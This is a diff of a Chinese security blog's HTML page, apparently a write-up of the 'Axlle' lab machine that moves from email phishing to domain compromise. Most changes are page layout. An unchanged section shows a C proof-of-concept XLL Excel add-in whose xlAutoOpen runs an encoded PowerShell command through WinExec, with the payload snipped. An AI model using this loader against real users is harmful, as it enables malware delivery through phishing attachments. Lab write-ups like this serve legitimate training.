@@ -7,9 +7,9 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
     <meta name="description" content="一句话总结：  🚀 靶场概述难度：hard描述： 邮件钓鱼到域内渗透  📋 基本信息   🚀 本地机器信息 目标机器信息     IP 10.10.16.27 10.10.11.21    OS Kali Windwos     🔍 信息搜集1. 🛠️ 端口扫描 使用工具如 nmap 或 masscan 进行端口扫描，发现目标机器开放的端口。  12345678910111213141">
-<meta property="og:type" content="website">
+<meta property="og:type" content="article">
 <meta property="og:title" content="THB-Axlle">
-<meta property="og:url" content="https://imli.ink/Axlle.html">
+<meta property="og:url" content="https://imli.ink/2024/11/22/Axlle/index.html">
 <meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
 <meta property="og:description" content="一句话总结：  🚀 靶场概述难度：hard描述： 邮件钓鱼到域内渗透  📋 基本信息   🚀 本地机器信息 目标机器信息     IP 10.10.16.27 10.10.11.21    OS Kali Windwos     🔍 信息搜集1. 🛠️ 端口扫描 使用工具如 nmap 或 masscan 进行端口扫描，发现目标机器开放的端口。  12345678910111213141">
 <meta property="og:locale" content="zh_CN">
@@ -33,8 +33,8 @@
 <meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122180428.png">
 <meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122182139.png">
 <meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122182036.png">
-<meta property="article:published_time" content="2024-11-22T10:22:58.208Z">
-<meta property="article:modified_time" content="2024-11-22T10:22:58.208Z">
+<meta property="article:published_time" content="2024-11-22T07:32:27.368Z">
+<meta property="article:modified_time" content="2024-11-22T07:32:27.368Z">
 <meta property="article:author" content="Leon">
 <meta property="article:tag" content="靶场">
 <meta property="article:tag" content="THB">
@@ -96,50 +96,113 @@
 
 <body class="max-width mx-auto px3 ltr">
     
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/sites/">站点</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/11/21/wreath/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/22/Axlle/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/22/Axlle/&text=THB-Axlle"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/22/Axlle/&is_video=false&description=THB-Axlle"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=THB-Axlle&body=Check out this article: https://imli.ink/2024/11/22/Axlle/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/22/Axlle/&name=THB-Axlle&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/22/Axlle/&t=THB-Axlle"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9A%80-%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">🚀 靶场概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">📋 基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">🔍 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%F0%9F%9B%A0%EF%B8%8F-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 🛠️ 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%94%8E-%E8%B7%AF%E5%BE%84%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 🔎 路径探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%F0%9F%A7%B0-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 🧰 服务枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">🧠 渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMTP-%E6%9C%8D%E5%8A%A1-25-tcp"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. SMTP 服务 (25&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DNS-%E6%9C%8D%E5%8A%A1-53-tcp"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. DNS 服务 (53&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTTP-%E6%9C%8D%E5%8A%A1-80-tcp"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. HTTP 服务 (80&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Kerberos-%E6%9C%8D%E5%8A%A1-88-tcp"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. Kerberos 服务 (88&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LDAP-%E6%9C%8D%E5%8A%A1-389-tcp"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. LDAP 服务 (389&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SMB-%E6%9C%8D%E5%8A%A1-445-tcp"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. SMB 服务 (445&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. 主机信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90"><span class="toc-number">1.3.8.</span> <span class="toc-text">风险分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-Web-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">🌐 Web 渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">主机信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTA"><span class="toc-number">1.5.1.</span> <span class="toc-text">HTA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A8-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">🔨 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ForceChangePassword-%EF%BC%88%E5%BC%BA%E5%88%B6%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number">1.6.1.</span> <span class="toc-text">ForceChangePassword （强制更改密码）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.8.</span> <span class="toc-text">📚 知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B3-%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%8E%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.9.</span> <span class="toc-text">🧳 攻击链与流程图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%85-%E6%80%BB%E7%BB%93"><span class="toc-number">1.10.</span> <span class="toc-text">📅 总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
     <div class="content index py4 ">
         
-          <header id="header">
-  <a class="u-url u-uid" href="/">
-  
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
     
-      <img id="logo" alt class="u-logo" src="/images/logo.png" />
-    
-  
-    <div id="title">
-      <h1 class="p-name">安全杂谈 | 网络安全、渗透测试、信息安全技术分享</h1>
-    </div>
-  </a>
-  <div id="nav">
-    <ul>
-      <li class="icon">
-        <a href="#" aria-label="目录"><i class="fa-solid fa-bars fa-2x"></i></a>
-      </li>
-      <!--
-     --><li><a href="/">首页</a></li><!--
-   --><!--
-     --><li><a href="/archives/">归档</a></li><!--
-   --><!--
-     --><li><a href="/tags/">标签</a></li><!--
-   --><!--
-     --><li><a href="/sites/">站点</a></li><!--
-   --><!--
-     --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
-   --><!--
-     --><li><a href="/search/">搜索</a></li><!--
-   --><!--
-     --><li><a href="/about/">关于</a></li><!--
-   -->
-    </ul>
-  </div>
-</header>
+    <h1 class="posttitle p-name" itemprop="name headline">
+        THB-Axlle
+    </h1>
 
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  
 
-  <div class="content" itemprop="articleBody">
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Leon</span>
+      </span>
       
-          <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+    <div class="postdate">
+      
+        <time datetime="2024-11-22T07:32:27.368Z" class="dt-published" itemprop="datePublished">2024-11-22</time>
+        
+        (Updated: <time datetime="2024-11-22T07:32:27.368Z" class="dt-updated" itemprop="dateModified">2024-11-22</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/THB/" rel="tag">THB</a>, <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
 <p>一句话总结：</p>
 </blockquote>
 <h1 id="🚀-靶场概述"><a href="#🚀-靶场概述" class="headerlink" title="🚀 靶场概述"></a>🚀 靶场概述</h1><p><strong>难度</strong>：hard<br><strong>描述</strong>： 邮件钓鱼到域内渗透</p>
@@ -272,7 +335,7 @@
 </li>
 </ul>
 <hr>
-<h2 id="🌐-Web-渗透测试"><a href="#🌐-Web-渗透测试" class="headerlink" title="🌐 Web 渗透测试"></a>🌐 Web 渗透测试</h2><p>如果您有任何未付的发票或请求，请以Excel格式将其通过电子邮件发送至<a href="mailto:&#97;&#99;&#x63;&#x6f;&#117;&#x6e;&#116;&#115;&#x40;&#97;&#x78;&#108;&#x6c;&#x65;&#x2e;&#x68;&#116;&#98;">&#97;&#99;&#x63;&#x6f;&#117;&#x6e;&#116;&#115;&#x40;&#97;&#x78;&#108;&#x6c;&#x65;&#x2e;&#x68;&#116;&#98;</a>。请注意，由于我们的安全状况，所有宏都被禁用。 </p>
+<h2 id="🌐-Web-渗透测试"><a href="#🌐-Web-渗透测试" class="headerlink" title="🌐 Web 渗透测试"></a>🌐 Web 渗透测试</h2><p>如果您有任何未付的发票或请求，请以Excel格式将其通过电子邮件发送至<a href="mailto:&#97;&#99;&#99;&#x6f;&#x75;&#110;&#x74;&#115;&#x40;&#97;&#x78;&#x6c;&#x6c;&#x65;&#x2e;&#104;&#x74;&#98;">&#97;&#99;&#99;&#x6f;&#x75;&#110;&#x74;&#115;&#x40;&#97;&#x78;&#x6c;&#x6c;&#x65;&#x2e;&#104;&#x74;&#98;</a>。请注意，由于我们的安全状况，所有宏都被禁用。 </p>
 <p>XLL （Excel Add-In） 执行攻击是一种网络攻击，它利用 XLL 文件在 Microsoft Excel 中执行恶意代码。XLL 文件是专为与 Excel 一起使用而设计的动态链接库 （DLL），允许开发人员使用自定义函数和特性扩展 Excel 的功能。</p>
 <p>poc</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"> </span><br><span class="line">__declspec(dllexport) void __cdecl xlAutoOpen(void);</span><br><span class="line"> </span><br><span class="line">void __cdecl xlAutoOpen() &#123;</span><br><span class="line">    WinExec(&quot;powershell -e &lt;snipped&gt;pAA==&quot;, 1);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">) &#123;</span><br><span class="line">    switch (ul_reason_for_call) &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -372,9 +435,76 @@
         };
         lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
         }</script>
-        
   </div>
 </article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/sites/">站点</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9A%80-%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">🚀 靶场概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">📋 基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">🔍 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%F0%9F%9B%A0%EF%B8%8F-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 🛠️ 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%94%8E-%E8%B7%AF%E5%BE%84%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 🔎 路径探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%F0%9F%A7%B0-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 🧰 服务枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">🧠 渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMTP-%E6%9C%8D%E5%8A%A1-25-tcp"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. SMTP 服务 (25&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DNS-%E6%9C%8D%E5%8A%A1-53-tcp"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. DNS 服务 (53&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTTP-%E6%9C%8D%E5%8A%A1-80-tcp"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. HTTP 服务 (80&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Kerberos-%E6%9C%8D%E5%8A%A1-88-tcp"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. Kerberos 服务 (88&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LDAP-%E6%9C%8D%E5%8A%A1-389-tcp"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. LDAP 服务 (389&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SMB-%E6%9C%8D%E5%8A%A1-445-tcp"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. SMB 服务 (445&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. 主机信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90"><span class="toc-number">1.3.8.</span> <span class="toc-text">风险分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-Web-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">🌐 Web 渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">主机信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTA"><span class="toc-number">1.5.1.</span> <span class="toc-text">HTA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A8-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">🔨 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ForceChangePassword-%EF%BC%88%E5%BC%BA%E5%88%B6%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number">1.6.1.</span> <span class="toc-text">ForceChangePassword （强制更改密码）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.8.</span> <span class="toc-text">📚 知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B3-%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%8E%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.9.</span> <span class="toc-text">🧳 攻击链与流程图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%85-%E6%80%BB%E7%BB%93"><span class="toc-number">1.10.</span> <span class="toc-text">📅 总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/22/Axlle/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/22/Axlle/&text=THB-Axlle"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/22/Axlle/&is_video=false&description=THB-Axlle"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=THB-Axlle&body=Check out this article: https://imli.ink/2024/11/22/Axlle/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/22/Axlle/&title=THB-Axlle"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/22/Axlle/&name=THB-Axlle&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/22/Axlle/&t=THB-Axlle"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
 
         
         <footer id="footer">
@@ -464,6 +594,29 @@
 
 
 <!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
 <script src="/js/main.js"></script>
